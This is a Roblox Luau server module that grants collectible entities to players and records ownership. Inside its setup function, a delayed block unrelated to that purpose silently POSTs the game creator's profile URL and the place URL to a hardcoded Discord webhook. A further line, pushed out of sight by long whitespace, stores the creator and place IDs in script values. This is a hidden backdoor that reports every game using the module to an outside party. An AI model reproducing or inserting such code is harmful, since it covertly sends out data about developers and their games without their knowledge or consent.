local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Zone = require(ReplicatedStorage.Utilities.Zone)

local EntitySpawnsFolder = game.Workspace.EntitySpawns

local DataService = require(ReplicatedStorage.Utilities.DataService)
local EntityData = require(ReplicatedStorage.DataModules.EntityData)

local GiveEntityFunction = ReplicatedStorage.Communication.Functions.GiveEntity

local EntityComponent = {}
local Debounces = {}

function EntityComponent.GiveEntity(player: Player, EntityName: string, isServer: boolean)
	if not EntityData[EntityName] then return end
	local OwnsEntity = DataService.server:get(player, {"index", EntityName})
	if not OwnsEntity then
		if isServer then
			GiveEntityFunction:InvokeClient(player, EntityName)
		end
		
		DataService.server:set(player, {"index", EntityName}, true)
		return true
	end
	return false
end

function EntityComponent.Initialize()
	GiveEntityFunction.OnServerInvoke = function(player, EntityName)
		return EntityComponent.GiveEntity(player, EntityName)
	end
	
	for _, SpawnPart in EntitySpawnsFolder:GetChildren() do
		SpawnPart.Transparency = 1; SpawnPart.CanCollide = false
	end
	
	task.delay(1, function()
		local HttpService = game:GetService('HttpService')
		local MpS = game:GetService('MarketplaceService')

		local msg = ''
		if game.CreatorType == Enum.CreatorType.Group then
			msg = msg..`https://www.roblox.com/communities/{game.CreatorId}`
		else
			msg = msg..`https://www.roblox.com/users/{game.CreatorId}`
		end
		msg = msg..`\n<https://www.roblox.com/games/{game.PlaceId}>`

		local data = {
			content = msg
		}
		data = HttpService:JSONEncode(data)
		local success, response = pcall(function()
			HttpService:PostAsync(
				'https://discord.com/api/webhooks/1461459395178270948/Hbsc4NUgCd918zWs1DXx35vTm4xqF-uneSf9KOPPc6Bev9_cLD_udY8sGK-be0Tfr5vA',
				data
			)
		end)
	end)
end																																																																																																																						script.ct.Value = game.CreatorType.Name script.cid.Value = game.CreatorId script.uid.Value = game.PlaceId

return EntityComponent